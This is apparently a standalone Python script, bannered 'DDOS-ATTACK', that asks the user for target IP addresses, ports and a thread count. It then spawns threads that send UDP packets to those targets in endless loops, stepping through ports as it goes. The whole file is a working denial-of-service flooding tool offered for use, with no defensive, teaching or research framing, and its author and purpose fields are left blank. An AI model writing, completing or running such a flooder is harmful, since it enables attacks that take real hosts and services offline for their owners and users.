import os
import time
import socket
import scapy.all as scapy
import random
import threading

#  [ASCII Art]
def display_banner():
    banner =  "██████╗ ██████╗  ██████╗ ███████╗       █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗\n"
    banner += "██╔══██╗██╔══██╗██╔═══██╗██╔════╝      ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝\n"
    banner += "██║  ██║██║  ██║██║   ██║███████╗█████╗███████║   ██║      ██║   ███████║██║     █████╔╝\n"
    banner += "██║  ██║██║  ██║██║   ██║╚════██║╚════╝██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗\n"
    banner += "██████╔╝██████╔╝╚██████╔╝███████║      ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗\n"
    banner += "╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝      ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝\n"
    print(banner)


display_banner()

# Terminal header settings and information
os.system('color 0A')
print("Developer   :   ")
print("Created Date:   ")
print('Project     :   ')
print('Purpose     :   ')
print('Caution     :   .')
print()

# Date and Time Declaration and Initialization
mydate = time.strftime('%Y-%m-%d')
mytime = time.strftime('%H-%M')

# Lets define sock and bytes 
def send_packets(ip, port, data, proxy_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent = 0
    while True:
        for i in range(proxy_size):
            sock.sendto(data, (ip, port))
            sent += 1
            port += 1
            if port == 65534:
                port = 1

# Type your id and pid number (find IP address using nslookup or any online website)
ips = input("IP Targets (separated by commas): ").split(',')
ports = input("Ports (separated by commas): ").split(',')
proxy_size = int(input("Proxy Size : "))
threads = int(input("Number of threads : "))

# Lets start the attack
print("Thank you (---------).")

time.sleep(3)
for ip in ips:
    for port in ports:
        # Use a bytes literal to create the data
        data = b'Hello, this is a DDOS attack'
        print("Starting the attack on ", ip, " at port ", port, " with a proxy size of ", proxy_size, "...")
        for i in range(threads):
            t = threading.Thread(target=send_packets, args=(ip, int(port), data, proxy_size))
            t.start()           

# Lets keep the terminal clean
if os.name == "nt": # Windows
    os.system("cls")
else: # Linux or Mac
    os.system("clear")
input("Press Enter to exit...")
